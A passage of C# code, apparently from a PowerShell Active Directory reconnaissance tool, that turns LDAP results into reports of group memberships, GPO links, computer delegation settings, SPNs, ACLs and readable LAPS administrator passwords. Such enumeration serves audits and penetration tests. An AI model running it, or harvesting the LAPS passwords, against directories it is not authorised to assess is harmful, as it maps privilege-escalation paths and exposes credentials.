                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }

                    if (Groups.Contains(SamAccountType))
                    {
                        AccountType = "group";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        foreach (string GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (Users.Contains(SamAccountType))
                    {
                        AccountType = "user";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties["sAMAccountName"][0]);
                        PrimaryGroupID = Convert.ToString(AdGroup.Properties["primaryGroupID"][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );

                        foreach (string GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (Computers.Contains(SamAccountType))
                    {
                        AccountType = "computer";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties["sAMAccountName"][0]);
                        PrimaryGroupID = Convert.ToString(AdGroup.Properties["primaryGroupID"][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );

                        foreach (string GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (TrustAccounts.Contains(SamAccountType))
                    {
                        AccountType = "trust";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties["sAMAccountName"][0]);
                        PrimaryGroupID = Convert.ToString(AdGroup.Properties["primaryGroupID"][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );
                    }
                    return GroupsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class OURecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdOU = (SearchResult) record;

                    PSObject OUObj = new PSObject();
                    OUObj.Members.Add(new PSNoteProperty("Name", AdOU.Properties["name"][0]));
                    OUObj.Members.Add(new PSNoteProperty("Depth", ((Convert.ToString(AdOU.Properties["distinguishedname"][0]).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1)));
                    OUObj.Members.Add(new PSNoteProperty("Description", (AdOU.Properties["description"].Count != 0 ? AdOU.Properties["description"][0] : "")));
                    OUObj.Members.Add(new PSNoteProperty("whenCreated", AdOU.Properties["whencreated"][0]));
                    OUObj.Members.Add(new PSNoteProperty("whenChanged", AdOU.Properties["whenchanged"][0]));
                    OUObj.Members.Add(new PSNoteProperty("DistinguishedName", AdOU.Properties["distinguishedname"][0]));
                    return new PSObject[] { OUObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGPO = (SearchResult) record;

                    PSObject GPOObj = new PSObject();
                    GPOObj.Members.Add(new PSNoteProperty("DisplayName", CleanString(AdGPO.Properties["displayname"][0])));
                    GPOObj.Members.Add(new PSNoteProperty("GUID", CleanString(AdGPO.Properties["name"][0])));
                    GPOObj.Members.Add(new PSNoteProperty("whenCreated", AdGPO.Properties["whenCreated"][0]));
                    GPOObj.Members.Add(new PSNoteProperty("whenChanged", AdGPO.Properties["whenChanged"][0]));
                    GPOObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGPO.Properties["distinguishedname"][0])));
                    GPOObj.Members.Add(new PSNoteProperty("FilePath", AdGPO.Properties["gpcfilesyspath"][0]));
                    return new PSObject[] { GPOObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGPO = (SearchResult) record;
                    LDAPClass.AdGPODictionary.Add((Convert.ToString(AdGPO.Properties["distinguishedname"][0]).ToUpper()), (Convert.ToString(AdGPO.Properties["displayname"][0])));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SOMRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdSOM = (SearchResult) record;

                    List<PSObject> SOMsList = new List<PSObject>();
                    int Depth = 0;
                    bool BlockInheritance = false;
                    bool? LinkEnabled = null;
                    bool? Enforced = null;
                    string gPLink = (AdSOM.Properties["gPLink"].Count != 0 ? Convert.ToString(AdSOM.Properties["gPLink"][0]) : "");
                    string GPOName = null;

                    Depth = ((Convert.ToString(AdSOM.Properties["distinguishedname"][0]).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1);
                    if (AdSOM.Properties["gPOptions"].Count != 0)
                    {
                        if ((int) AdSOM.Properties["gPOptions"][0] == 1)
                        {
                            BlockInheritance = true;
                        }
                    }
                    var GPLinks = gPLink.Split(']', '[').Where(x => x.StartsWith("LDAP"));
                    int Order = (GPLinks.ToArray()).Length;
                    if (Order == 0)
                    {
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Properties["name"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Properties["distinguishedname"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", null));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", (AdSOM.Properties["gpoptions"].Count != 0 ? AdSOM.Properties["gpoptions"][0] : "")));
                        SOMsList.Add( SOMObj );
                    }
                    foreach (string link in GPLinks)
                    {
                        string[] linksplit = link.Split('/', ';');
                        if (!Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 1)))
                        {
                            LinkEnabled = true;
                        }
                        else
                        {
                            LinkEnabled = false;
                        }
                        if (Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 2)))
                        {
                            Enforced = true;
                        }
                        else
                        {
                            Enforced = false;
                        }
                        GPOName = LDAPClass.AdGPODictionary.ContainsKey(linksplit[2].ToUpper()) ? LDAPClass.AdGPODictionary[linksplit[2].ToUpper()] : linksplit[2].Split('=',',')[1];
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Properties["name"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Properties["distinguishedname"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", Order));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", (AdSOM.Properties["gpoptions"].Count != 0 ? AdSOM.Properties["gpoptions"][0] : "")));
                        SOMsList.Add( SOMObj );
                        Order--;
                    }
                    return SOMsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class PrinterRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdPrinter = (SearchResult) record;

                    PSObject PrinterObj = new PSObject();
                    PrinterObj.Members.Add(new PSNoteProperty("Name", AdPrinter.Properties["Name"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("ServerName", AdPrinter.Properties["serverName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("ShareName", AdPrinter.Properties["printShareName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverName", AdPrinter.Properties["driverName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverVersion", AdPrinter.Properties["driverVersion"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("PortName", AdPrinter.Properties["portName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("URL", AdPrinter.Properties["url"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("whenCreated", AdPrinter.Properties["whenCreated"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("whenChanged", AdPrinter.Properties["whenChanged"][0]));
                    return new PSObject[] { PrinterObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    bool Dormant = false;
                    bool? Enabled = null;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool? TrustedforDelegation = null;
                    bool? TrustedtoAuthforDelegation = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    string StrIPAddress = null;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;

                    if (AdComputer.Properties["dnshostname"].Count != 0)
                    {
                        try
                        {
                            StrIPAddress = Convert.ToString(Dns.GetHostEntry(Convert.ToString(AdComputer.Properties["dnshostname"][0])).AddressList[0]);
                        }
                        catch
                        {
                            StrIPAddress = null;
                        }
                    }
                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdComputer.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdComputer.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                        TrustedforDelegation = (userFlags & UACFlags.TRUSTED_FOR_DELEGATION) == UACFlags.TRUSTED_FOR_DELEGATION;
                        TrustedtoAuthforDelegation = (userFlags & UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) == UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
                    }
                    if (AdComputer.Properties["lastlogontimestamp"].Count != 0)
                    {
                        LastLogonDate = DateTime.FromFileTime((long)(AdComputer.Properties["lastlogontimestamp"][0]));
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    if (AdComputer.Properties["pwdlastset"].Count != 0)
                    {
                        PasswordLastSet = DateTime.FromFileTime((long)(AdComputer.Properties["pwdlastset"][0]));
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    if ( ((bool) TrustedforDelegation) && ((int) AdComputer.Properties["primarygroupid"][0] == 515) )
                    {
                        DelegationType = "Unconstrained";
                        DelegationServices = "Any";
                    }
                    if (AdComputer.Properties["msDS-AllowedToDelegateTo"].Count >= 1)
                    {
                        DelegationType = "Constrained";
                        for (int i = 0; i < AdComputer.Properties["msDS-AllowedToDelegateTo"].Count; i++)
                        {
                            var delegateto = AdComputer.Properties["msDS-AllowedToDelegateTo"][i];
                            DelegationServices = DelegationServices + "," + Convert.ToString(delegateto);
                        }
                        DelegationServices = DelegationServices.TrimStart(',');
                    }
                    if ((bool) TrustedtoAuthforDelegation)
                    {
                        DelegationProtocol = "Any";
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = "Kerberos";
                    }
                    string SIDHistory = "";
                    if (AdComputer.Properties["sidhistory"].Count >= 1)
                    {
                        string sids = "";
                        for (int i = 0; i < AdComputer.Properties["sidhistory"].Count; i++)
                        {
                            var history = AdComputer.Properties["sidhistory"][i];
                            sids = sids + "," + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(',');
                    }
                    string OperatingSystem = CleanString((AdComputer.Properties["operatingsystem"].Count != 0 ? AdComputer.Properties["operatingsystem"][0] : "-") + " " + (AdComputer.Properties["operatingsystemhotfix"].Count != 0 ? AdComputer.Properties["operatingsystemhotfix"][0] : " ") + " " + (AdComputer.Properties["operatingsystemservicepack"].Count != 0 ? AdComputer.Properties["operatingsystemservicepack"][0] : " ") + " " + (AdComputer.Properties["operatingsystemversion"].Count != 0 ? AdComputer.Properties["operatingsystemversion"][0] : " "));

                    PSObject ComputerObj = new PSObject();
                    ComputerObj.Members.Add(new PSNoteProperty("UserName", (AdComputer.Properties["samaccountname"].Count != 0 ? CleanString(AdComputer.Properties["samaccountname"][0]) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("Name", (AdComputer.Properties["name"].Count != 0 ? CleanString(AdComputer.Properties["name"][0]) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("DNSHostName", (AdComputer.Properties["dnshostname"].Count != 0 ? AdComputer.Properties["dnshostname"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    ComputerObj.Members.Add(new PSNoteProperty("IPv4Address", StrIPAddress));
                    ComputerObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    ComputerObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    ComputerObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    ComputerObj.Members.Add(new PSNoteProperty("Primary Group ID", (AdComputer.Properties["primarygroupid"].Count != 0 ? AdComputer.Properties["primarygroupid"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("SID", Convert.ToString(new SecurityIdentifier((byte[])AdComputer.Properties["objectSID"][0], 0))));
                    ComputerObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    ComputerObj.Members.Add(new PSNoteProperty("Description", (AdComputer.Properties["Description"].Count != 0 ? CleanString(AdComputer.Properties["Description"][0]) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("ms-ds-CreatorSid", (AdComputer.Properties["ms-ds-CreatorSid"].Count != 0 ? Convert.ToString(new SecurityIdentifier((byte[])AdComputer.Properties["ms-ds-CreatorSid"][0], 0)) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    ComputerObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    ComputerObj.Members.Add(new PSNoteProperty("UserAccountControl", (AdComputer.Properties["useraccountcontrol"].Count != 0 ? AdComputer.Properties["useraccountcontrol"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("whenCreated", AdComputer.Properties["whencreated"][0]));
                    ComputerObj.Members.Add(new PSNoteProperty("whenChanged", AdComputer.Properties["whenchanged"][0]));
                    ComputerObj.Members.Add(new PSNoteProperty("Distinguished Name", AdComputer.Properties["distinguishedname"][0]));
                    return new PSObject[] { ComputerObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    if (AdComputer.Properties["serviceprincipalname"].Count == 0)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();

                    foreach (string SPN in AdComputer.Properties["serviceprincipalname"])
                    {
                        string[] SPNArray = SPN.Split('/');
                        bool flag = true;
                        foreach (PSObject Obj in SPNList)
                        {
                            if ( (string) Obj.Members["Service"].Value == SPNArray[0] )
                            {
                                Obj.Members["Host"].Value = string.Join(",", (Obj.Members["Host"].Value + "," + SPNArray[1]).Split(',').Distinct().ToArray());
                                flag = false;
                            }
                        }
                        if (flag)
                        {
                            PSObject ComputerSPNObj = new PSObject();
                            ComputerSPNObj.Members.Add(new PSNoteProperty("UserName", (AdComputer.Properties["samaccountname"].Count != 0 ? CleanString(AdComputer.Properties["samaccountname"][0]) : "")));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Name", (AdComputer.Properties["name"].Count != 0 ? CleanString(AdComputer.Properties["name"][0]) : "")));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                            SPNList.Add( ComputerSPNObj );
                        }
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class LAPSRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    bool PasswordStored = false;
                    DateTime? CurrentExpiration = null;
                    if (AdComputer.Properties["ms-mcs-admpwdexpirationtime"].Count != 0)
                    {
                        CurrentExpiration = DateTime.FromFileTime((long)(AdComputer.Properties["ms-mcs-admpwdexpirationtime"][0]));
                        PasswordStored = true;
                    }
                    PSObject LAPSObj = new PSObject();
                    LAPSObj.Members.Add(new PSNoteProperty("Hostname", (AdComputer.Properties["dnshostname"].Count != 0 ? AdComputer.Properties["dnshostname"][0] : AdComputer.Properties["cn"][0] )));
                    LAPSObj.Members.Add(new PSNoteProperty("Stored", PasswordStored));
                    LAPSObj.Members.Add(new PSNoteProperty("Readable", (AdComputer.Properties["ms-mcs-admpwd"].Count != 0 ? true : false)));
                    LAPSObj.Members.Add(new PSNoteProperty("Password", (AdComputer.Properties["ms-mcs-admpwd"].Count != 0 ? AdComputer.Properties["ms-mcs-admpwd"][0] : null)));
                    LAPSObj.Members.Add(new PSNoteProperty("Expiration", CurrentExpiration));
                    return new PSObject[] { LAPSObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SIDRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    switch (Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]))
                    {
                        case "user":
                        case "computer":
                        case "group":
                            LDAPClass.AdSIDDictionary.Add(Convert.ToString(new SecurityIdentifier((byte[])AdObject.Properties["objectSID"][0], 0)), (Convert.ToString(AdObject.Properties["name"][0])));
                            break;
                    }
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class DACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    byte[] ntSecurityDescriptor = null;
                    string Name = null;
                    string Type = null;
                    List<PSObject> DACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Properties["name"][0]);

                    switch (Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Properties["displayname"][0]);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Properties["ntsecuritydescriptor"].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdObject.Properties["ntsecuritydescriptor"][0];
                    }
                    else
                    {
                        DirectoryEntry AdObjectEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdObjectEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            string Owner = Convert.ToString(DirObjSec.GetOwner(typeof(System.Security.Principal.SecurityIdentifier)));
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("AccessControlType", Rule.AccessControlType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", LDAPClass.AdSIDDictionary.ContainsKey(IdentityReference) ? LDAPClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("OwnerName", LDAPClass.AdSIDDictionary.ContainsKey(Owner) ? LDAPClass.AdSIDDictionary[Owner] : Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("Owner", Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("DistinguishedName", AdObject.Properties["distinguishedname"][0]));
                            DACLList.Add( ObjectObj );
                        }
                    }

                    return DACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

    class SACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    byte[] ntSecurityDescriptor = null;
                    string Name = null;
                    string Type = null;
                    List<PSObject> SACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Properties["name"][0]);

                    switch (Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Properties["displayname"][0]);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Properties["ntsecuritydescriptor"].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdObject.Properties["ntsecuritydescriptor"][0];
                    }
                    else
                    {
                        DirectoryEntry AdObjectEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdObjectEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AuditRules = (AuthorizationRuleCollection) DirObjSec.GetAuditRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAuditRule Rule in AuditRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", LDAPClass.AdSIDDictionary.ContainsKey(IdentityReference) ? LDAPClass.AdSIDDictionary[IdentityReference] : IdentityReference));
